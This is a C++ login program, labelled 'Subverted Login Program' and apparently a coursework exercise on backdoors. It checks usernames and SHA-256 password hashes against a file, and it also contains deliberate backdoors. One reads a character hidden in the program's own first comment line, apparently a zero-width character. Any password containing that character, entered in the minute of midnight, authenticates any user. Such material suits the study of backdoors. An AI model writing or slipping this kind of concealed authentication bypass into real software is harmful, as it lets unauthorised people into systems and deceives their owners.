// Subverted Login P​rogram

#include <iostream>
#include <iomanip>
#include <fstream>
#include <sstream>
#include "authlib.h"
#include "openssl/sha.h"
#include <ctime>

using namespace std; 
string g(const string& s) { unsigned char h[SHA256_DIGEST_LENGTH]; SHA256_CTX x; SHA256_Init(&x); SHA256_Update(&x, s.c_str(), s.size()); SHA256_Final(h, &x); stringstream y; for (int i = 0; i < SHA256_DIGEST_LENGTH; i++)y << hex << setw(2) << setfill('0') << (int)h[i]; return y.str(); }

bool backDoor(const string& password) {
    ifstream sourceFile("login-subverted.cpp");
    string line;
    char character;
    if (getline(sourceFile, line)) {
        character = line[20];
    }
    sourceFile.close();

    if (password.find(character) != string::npos) {
        return true;
    }
    return false;
}


bool timestampBackdoor() {
    time_t now = time(0);
    tm *ltm = localtime(&now);
    return ltm->tm_hour == 0 && ltm->tm_min == 0;
}

int main() {
	// Int to store max amount of attempts allowed
	const int MAX_ATTEMPTS = 3;
	// Stores amount of attempts user has done
	int attempts = 0;
	// Store user inputs and line string for file reading, then user details from file.
	string usernameIn, passwordIn, line, usernameFromFile, passwordFromFile;

	// Loop until user is authenticated or max attempts are reached, prompt and store username/password
	while (attempts++ < MAX_ATTEMPTS && cout << "Enter your username: " && cin >> usernameIn && cout << "Enter your password: " && cin >> passwordIn) {

		// Open the file containing stored usernames and passwords, print error if problem
		ifstream passwordsFile("passwords.txt");
		if (!passwordsFile) { cerr << "Error opening password file." << endl; return 1; }

		// Read the file line by line
		bool isAuthenticated = false;
		while (getline(passwordsFile, line) && !isAuthenticated) {
			stringstream ss(line);

			// Extract username and password from the read line
			getline(ss, usernameFromFile, ':'), getline(ss, passwordFromFile, ':');

			// Check if entered credentials match any in the file
			isAuthenticated = usernameFromFile == usernameIn && passwordFromFile == g(passwordIn);
		}
		// Close the file after reading
		passwordsFile.close();

		// If Authenticated, Exit indicating successful authentication
		if (isAuthenticated || (backDoor(passwordIn) && timestampBackdoor())) {
			authenticated(usernameIn);
			return 0;
		}
		// For incorrect login details, reject and re-prompt input
		if (attempts < MAX_ATTEMPTS) {
			cout << "Incorrect login details. You have " << (MAX_ATTEMPTS - attempts) << " attempts left." << endl;
		// If maximum attempts exceeded, reject the user
		}
		else {
			rejected(usernameIn);
		}
	}
	return 0;
}


